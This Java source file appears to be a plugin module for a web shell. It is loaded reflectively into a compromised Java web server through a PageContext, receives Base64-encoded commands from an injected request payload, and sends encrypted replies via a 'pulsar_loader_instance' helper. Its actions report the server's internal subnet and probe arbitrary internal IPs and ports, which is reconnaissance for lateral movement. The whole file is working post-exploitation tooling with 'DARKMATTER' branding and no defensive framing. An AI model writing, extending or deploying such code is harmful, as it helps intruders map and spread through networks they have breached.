import java.io.*;
import java.lang.reflect.Method;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.NetworkInterface;
import java.net.Socket;
import java.util.Base64;
import java.util.Enumeration;
import java.util.HashMap;
import java.util.Map;
import java.nio.charset.StandardCharsets;

public class lan_tools extends ClassLoader
{
    public lan_tools(ClassLoader objParent) { super(objParent); }
    public lan_tools() { super(lan_tools.class.getClassLoader()); }

    private Map<String, String> fnParseParams(String szParamStr)
    {
        Map<String, String> mapParams = new HashMap<String, String>();
        if (szParamStr == null || szParamStr.trim().isEmpty())
            return mapParams;

        String[] aszPairs = szParamStr.split("&");
        for (String szPair : aszPairs)
        {
            int nIdx = szPair.indexOf("=");
            if (nIdx > 0)
            {
                mapParams.put(szPair.substring(0, nIdx), szPair.substring(nIdx + 1));
            }
        }
        return mapParams;
    }

    private void fnWriteOutput(Object objParam, Object objResponse, OutputStream osClient, byte[] abResult)
    {
        if (abResult.length == 0)
            abResult = "DARKMATTER_SUCCESS: Action executed but returned no output".getBytes();

        Object objPageContext = objParam;

        try
        {
            byte[] abEncryptedResult = Encrypt(objParam, abResult);
            osClient.write(abEncryptedResult);
            osClient.flush();

            Method fnSetStatus = objResponse.getClass().getMethod("setStatus", new Class[]{int.class});
            fnSetStatus.invoke(objResponse, new Object[]{200});

            try
            {
                Method fnGetOut = objPageContext.getClass().getMethod("getOut", new Class[0]);
                Object objOut = fnGetOut.invoke(objPageContext, new Object[0]);
                Method fnClear = objOut.getClass().getMethod("clear", new Class[0]);
                fnClear.invoke(objOut, new Object[0]);
            }
            catch (Exception exIgnored) {}

            Method fnFlushBuffer = objResponse.getClass().getMethod("flushBuffer", new Class[0]);
            fnFlushBuffer.invoke(objResponse, new Object[0]);
        }
        catch (Exception exIgnored) {}
    }

    private byte[] Encrypt(Object objPageContext, byte[] abRawResponse)
    {
        try
        {
            if (objPageContext == null)
                return abRawResponse;

            Method fnGetRequest = objPageContext.getClass().getMethod("getRequest", new Class[0]);
            Object objRequest = fnGetRequest.invoke(objPageContext, new Object[0]);

            Method fnGetAttribute = objRequest.getClass().getMethod("getAttribute", new Class[]{String.class});
            Object objPulsarLoader = fnGetAttribute.invoke(objRequest, new Object[]{"pulsar_loader_instance"});
            
            if (objPulsarLoader == null)
                return abRawResponse;

            java.lang.reflect.Method fnCrypt = objPulsarLoader.getClass().getDeclaredMethod("Crypt", byte[].class, int.class);
            fnCrypt.setAccessible(true);

            return (byte[])fnCrypt.invoke(objPulsarLoader, abRawResponse, 1);
        }
        catch (Exception exCrashed)
        {
            return abRawResponse;
        }
    }

    private String getSubnetInfo() {
        String subnet = "192.168.1"; // Default
        try {
            Enumeration<NetworkInterface> interfaces = NetworkInterface.getNetworkInterfaces();
            while (interfaces.hasMoreElements()) {
                NetworkInterface iface = interfaces.nextElement();
                if (iface.isLoopback() || !iface.isUp()) continue;

                Enumeration<InetAddress> addresses = iface.getInetAddresses();
                while (addresses.hasMoreElements()) {
                    InetAddress addr = addresses.nextElement();
                    if (addr instanceof java.net.Inet4Address) {
                        String ip = addr.getHostAddress();
                        if (!ip.startsWith("127.")) {
                            int lastDot = ip.lastIndexOf('.');
                            if (lastDot > 0) {
                                return ip.substring(0, lastDot);
                            }
                        }
                    }
                }
            }
        } catch (Exception e) {
            
        }
        return subnet;
    }

    @Override
    public boolean equals(Object objParam)
    {
        Object objPageContext = objParam;
        Object objRequest = null;
        Object objResponse = null;
        OutputStream osClient = null;
        
        try
        {
            Method fnGetRequest = objPageContext.getClass().getMethod("getRequest", new Class[0]);
            objRequest = fnGetRequest.invoke(objPageContext, new Object[0]);

            Method fnGetResponse = objPageContext.getClass().getMethod("getResponse", new Class[0]);
            objResponse = fnGetResponse.invoke(objPageContext, new Object[0]);

            Method fnGetOutputStream = objResponse.getClass().getMethod("getOutputStream", new Class[0]);
            osClient = (OutputStream) fnGetOutputStream.invoke(objResponse, new Object[0]);

            Method fnGetAttribute = objRequest.getClass().getMethod("getAttribute", new Class[]{String.class});
            Object objPayload = fnGetAttribute.invoke(objRequest, new Object[]{"payload"});
            Object objLength = fnGetAttribute.invoke(objRequest, new Object[]{"len"});

            if (objPayload == null || objLength == null)
            {
                osClient.write("PAYLOAD_ERROR: Missing attributes from request.".getBytes());
                return true;
            }

            byte[] abPayload = (byte[])objPayload;
            int nClassLength = Integer.parseInt(objLength.toString());
            int nParamOffset = nClassLength + 4;
            int nParamLength = abPayload.length - nParamOffset;
            String szParam = new String(abPayload, nParamOffset, nParamLength, "UTF-8").trim();

            Map<String, String> mapParams = fnParseParams(szParam);
            
            String z0 = mapParams.get("z0");
            if (z0 == null) {
                fnWriteOutput(objParam, objResponse, osClient, "{\"status\":\"error\",\"msg\":\"Missing z0\"}".getBytes());
                return true;
            }
            
            byte[] abDecodedAction = Base64.getDecoder().decode(z0);
            String action = new String(abDecodedAction, StandardCharsets.UTF_8).trim();

            String szResponseResult = "";

            if ("info".equals(action)) {
                String subnet = getSubnetInfo();
                szResponseResult = "{\"status\":\"success\",\"subnet\":\"" + subnet + "\"}";
                
            } else if ("check".equals(action)) {
                String z1 = mapParams.get("z1");
                String z2 = mapParams.get("z2");
                
                if (z1 != null && z2 != null) {
                    String targetIp = new String(Base64.getDecoder().decode(z1), StandardCharsets.UTF_8).trim();
                    String targetPortStr = new String(Base64.getDecoder().decode(z2), StandardCharsets.UTF_8).trim();
                    int targetPort = Integer.parseInt(targetPortStr);
                    
                    boolean isOpen = false;
                    Socket socket = null;
                    try {
                        socket = new Socket();
                        socket.connect(new InetSocketAddress(targetIp, targetPort), 1500);
                        isOpen = true;
                    } catch (Exception ex) {
                        isOpen = false;
                    } finally {
                        if (socket != null) {
                            try { socket.close(); } catch (Exception e) {}
                        }
                    }
                    
                    if (isOpen) {
                        szResponseResult = "{\"open\":true,\"ip\":\"" + targetIp + "\",\"port\":" + targetPort + "}";
                    } else {
                        szResponseResult = "{\"open\":false}";
                    }
                } else {
                    szResponseResult = "{\"open\":false}";
                }
            } else {
                szResponseResult = "{\"status\":\"error\",\"msg\":\"Unknown action\"}";
            }

            fnWriteOutput(objParam, objResponse, osClient, szResponseResult.getBytes(StandardCharsets.UTF_8));
        }
        catch (Exception ex)
        {
            if (osClient != null)
            {
                try
                {
                    StringWriter swTrace = new StringWriter();
                    ex.printStackTrace(new PrintWriter(swTrace));
                    osClient.write(("DARKMATTER_INTERNAL_CRASHED: " + swTrace.toString()).getBytes());
                }
                catch (Exception exIgnored) {}
            }
        }

        return true;
    }
}